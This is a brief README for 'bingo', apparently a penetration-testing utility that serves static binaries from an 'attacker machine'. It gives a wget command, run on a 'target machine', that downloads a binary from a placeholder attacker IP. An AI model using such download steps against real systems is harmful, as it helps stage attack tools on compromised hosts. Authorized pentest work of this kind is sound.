# bingo

**bingo** is a server for static binaries.

## Installation

```bash
pipx install git+https://github.com/luskabol/bingo.git@main
```

## Usage

1. **On the attacker machine**
    ```bash
    bingo <port> # Default is 8000
    ```

2. **On the target machine**
    ```bash
    wget "http://<your-ip-address>:<port>/get/<binary-name>"
    ```
